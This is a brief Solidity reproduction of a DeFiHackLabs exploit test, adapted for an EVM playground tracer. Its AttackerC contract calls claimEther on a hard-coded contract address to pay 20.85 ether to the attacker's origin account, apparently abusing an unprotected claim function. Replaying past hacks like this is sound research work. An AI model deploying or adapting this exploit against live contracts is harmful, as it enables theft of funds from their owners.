pragma solidity ^0.8.10;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// X319_exp.sol test's logic verbatim. The original test's entire attack runs
// inside AttackerC's CONSTRUCTOR, but the playground never records the
// top-level exploit contract's own deploy — only a RECORDED function call is
// traced. So the constructor logic is moved into a plain `attack()` function,
// called directly by the attacker EOA (tx.origin is unchanged either way).

address constant addr1 = 0xedD632eAf3b57e100aE9142e8eD1641e5Fd6b2c0;

interface IAddr1 {
    function claimEther(address receiver, uint256 amount) external;
}

contract AttackerC {
    function attack() external {
        IAddr1(addr1).claimEther(tx.origin, 2085 * 10 ** 16);
    }
}
